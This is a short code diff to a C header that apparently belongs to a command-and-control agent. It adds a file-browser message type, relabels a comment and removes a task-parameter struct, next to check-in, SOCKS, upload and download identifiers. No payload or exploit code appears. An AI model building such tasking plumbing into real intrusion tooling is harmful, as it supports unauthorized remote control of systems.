@@ -27,8 +27,9 @@
 #define LINK_MSG            0x06
 #define LINK_REMOVE         0x07
 #define SOCKS_DATA          0x08
+#define FILE_BROWSER        0x09
 
-// General
+// Commands
 #define STATUS_CMD      0x37
 #define SLEEP_CMD       0x38
 #define EXAMPLE_CMD     0x40
@@ -73,13 +74,6 @@
 #define DOWNLOAD_RESP   0xCC
 #define UPLOAD_RESP     0xCD
 #define SOCKS_RESP      0xCE
-
-
-
-typedef struct _TASK_PARAMETER {
-    char* TaskUuid;        // UUID of the task
-    PPARSER TaskParser;    // Task parser object
-} TASK_PARAMETER, *PTASK_PARAMETER;
 
 BOOL TaskCheckin(PPARSER checkinResponseData);
 VOID TaskRoutine();
